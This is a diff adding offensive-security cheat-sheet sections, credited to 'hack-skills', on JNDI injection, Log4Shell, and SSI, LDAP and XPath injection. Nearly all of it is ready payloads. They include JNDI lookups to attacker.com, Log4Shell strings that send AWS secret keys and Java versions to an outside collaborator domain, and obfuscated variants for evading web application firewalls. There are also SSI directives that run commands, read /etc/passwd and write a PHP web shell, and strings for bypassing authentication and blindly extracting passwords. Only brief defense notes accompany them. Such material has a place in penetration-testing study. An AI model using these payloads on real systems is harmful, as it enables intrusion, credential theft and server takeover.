@@ -1971,3 +1971,162 @@ arbitrary code on the server.
 - OWASP LLM Top 10: https://owasp.org/www-project-top-10-for-large-language-model-applications/
 - Synacktiv GitHub Actions: https://www.synacktiv.com/en/publications/github-actions-exploitation-introduction
 - ImageTragick: https://imagetragick.com/
+
+
+---
+
+## From hack-skills: JNDI Injection & Log4Shell
+
+### JNDI Core
+
+Vulnerable Java code: `InitialContext.lookup(USER_INPUT)` with attacker-controlled URL.
+
+```
+# Attack vectors:
+rmi://attacker.com:1099/Exploit     → RMI classloading (pre-8u121)
+ldap://attacker.com:1389/cn=Exploit → LDAP (pre-8u191)
+dns://attacker.com/probe            → DNS-only (detection only)
+```
+
+### JDK Version Constraints
+
+| JDK Version | JNDI RCE Status |
+|---|---|
+| < 8u121 | Direct class loading via RMI and LDAP |
+| 8u121–8u190 | LDAP class loading still works; RMI blocked |
+| >= 8u191 | Remote class loading blocked for both |
+| Post-8u191 bypass | LDAP returns serialized Java object via `javaSerializedData` attribute |
+
+### Post-8u191 BeanFactory+EL Bypass (Tomcat ClassPath)
+
+```bash
+# Uses Tomcat's BeanFactory to execute EL expression without remote class:
+# Point LDAP to attacker server returning LDAP entry with:
+#   javaClassName: foo
+#   javaFactory: org.apache.naming.factory.BeanFactory
+#   javaSerializedData: <EL expression payload>
+# Requires Tomcat/SpringBoot with naming.BeanFactory on classpath
+```
+
+### Log4Shell (CVE-2021-44228)
+
+Log4j2 2.0-beta9 through 2.14.1. Any logged user input is vulnerable.
+
+```
+# Detection:
+${jndi:ldap://TOKEN.collab.net/a}
+
+# Version exfiltration:
+${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
+
+# Env var exfiltration (AWS credentials!):
+${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.TOKEN.collab.net}
+```
+
+### WAF Bypass for Log4Shell
+
+```
+${${lower:j}ndi:ldap://TOKEN.collab.net/a}
+${${::-j}${::-n}${::-d}${::-i}:ldap://TOKEN.collab.net/a}
+${${lower:j}${upper:n}${lower:d}${upper:i}:ldap://TOKEN.collab.net/a}
+${j${::-n}di:ldap://TOKEN.collab.net/a}
+${j${lower:n}di:ldap://TOKEN.collab.net/a}
+```
+
+### JNDI Injection Points (Comprehensive)
+
+```
+HTTP Headers: User-Agent, X-Forwarded-For, Referer, Accept-Language, X-Api-Version
+Cookie values (all cookie names and values)
+URL path segments, query parameters
+POST body fields (form data, JSON values)
+Search/filter query parameters
+File upload filename field
+GraphQL variables and query strings
+SOAP/XML element values
+```
+
+### Other Java JNDI Sinks (Beyond Log4j)
+
+```
+Spring JndiTemplate.lookup(USER_INPUT)
+Apache Solr: config API accepts jndi: in dataConfig
+Druid: stat monitor accepts jndi: in connectionProperties
+VMware vCenter: CVE-2021-21985 (JNDI via API)
+H2 Console: TRACE command accepts JNDI URLs
+Fastjson @type: JdbcRowSetImpl with dataSourceName=ldap://...
+```
+
+
+---
+
+## From hack-skills: SSI, LDAP, XPath Injection
+
+### SSI Injection (Server-Side Includes)
+
+SSI directives are parsed by web server (Apache `mod_include`, Nginx `ssi on`) before response:
+
+```
+# Safe probe (echoes date if SSI active):
+<!--#echo var="DATE_LOCAL"-->
+
+# Command execution:
+<!--#exec cmd="id"-->
+<!--#exec cmd="cat /etc/passwd"-->
+
+# File include:
+<!--#include virtual="/etc/passwd"-->
+
+# Web shell write:
+<!--#exec cmd="echo '<?php system($_GET[c]);?>' > /var/www/html/shell.php"-->
+```
+
+**Prerequisites**: Apache with `mod_include` + `Options +Includes`; file extension `.shtml`; or Nginx with `ssi on;`.
+
+**Attack via file upload**: Upload file named `shell.shtml` with SSI directives → trigger page load.
+
+### LDAP Injection
+
+LDAP filter syntax: `(&(uid=USER)(password=PASS))`. Special chars: `* ( ) & | ! \ NUL`
+
+```
+# Auth bypass:
+Username: admin)(&)
+# Filter: (&(uid=admin)(&))(password=anything)) → always TRUE
+
+# Wildcard bypass:
+Username: *   Password: *
+# (&(uid=*)(userPassword=*)) → matches all entries
+
+# Data extraction (brute character-by-character):
+(&(uid=admin)(password=a*))  → invalid
+(&(uid=admin)(password=s*))  → valid! → starts with 's'
+
+# Null byte truncation:
+Username: admin%00
+# LDAP query truncates at null byte → skips password check
+```
+
+**Defense**: Escape `* ( ) \ NUL` in LDAP input; use parameterized LDAP queries.
+
+### XPath Injection
+
+XPath filter: `//user[name='INPUT' and password='INPUT2']`
+
+```
+# Auth bypass:
+Username: admin' or '1'='1
+Password: anything' or '1'='1
+# Always matches first user
+
+# Blind XPath enumeration:
+' or string-length(//user[1]/password)=6 or '1'='2    # check password length
+' or substring(//user[1]/password,1,1)='s' or '1'='2  # extract char by char
+
+# Count users:
+' or count(//user)=2 and '1'='1
+```
+
+**Key XPath functions**: `string-length()`, `substring()`, `count()`, `name()`, `contains()`, `starts-with()`
+
+**Defense**: Parameterized XPath queries; reject `'`, `"`, `(`, `)`, `/`, `[`, `]`, `:`, `*`, `=` in input.
